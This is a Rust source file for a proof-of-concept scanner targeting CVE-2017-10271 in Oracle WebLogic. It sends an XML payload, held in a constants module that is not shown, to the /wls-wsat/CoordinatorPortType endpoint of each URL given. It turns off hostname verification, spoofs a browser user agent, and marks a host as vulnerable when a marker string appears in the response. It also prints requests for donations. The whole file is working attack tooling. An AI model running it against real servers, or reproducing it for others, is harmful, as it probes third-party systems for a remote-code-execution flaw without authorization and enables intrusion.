extern crate reqwest;

use reqwest::header;
use reqwest::Client;
use std::env;
use std::error::Error;
use std::result::Result;
use std::time::Duration;

mod constant;

fn main() {
    println!(
        "Thank you to use CVE-2017-10271 POC!\nTo help author, {}\n",
        constant::DONATE
    );
    let mut nargs = 0;
    for url in env::args() {
        nargs += 1;
        if nargs == 1 {
            continue;
        }
        print!("{}: ", url);
        let url = format!("{}/wls-wsat/CoordinatorPortType", url);
        let result = match test_site(&url) {
            Ok(true) => String::from("Vulnerable"),
            Ok(false) => String::from("Not Vulnerable"),
            Err(e) => format!("Error occured! {}", e),
        };
        println!("{}", result);
    }
    if nargs <= 1 {
        println!("\n{}", constant::USAGE);
    } else {
        println!("\nThank you for your donation. {}", constant::DONATE);
    }
}

fn test_site(url: &String) -> Result<bool, Box<Error>> {
    let mut response = Client::builder()
        .danger_disable_hostname_verification()
        .timeout(Some(Duration::from_secs(10)))
        .build()?
        .post(url)
        .header(header::UserAgent::new(
            "Mozilla/5.0 (X11; Fedora; Linux mips64; rv:59.0) Gecko/20100101 Firefox/59.0",
        ))
        .header(header::ContentType::xml())
        .body(constant::BODY)
        .send()?;
    let response = if !response.status().is_success() {
        return Ok(false);
    } else {
        response.text()?
    };
    if response.starts_with(constant::VULNER_TEXT) {
        Ok(true)
    } else {
        Ok(false)
    }
}
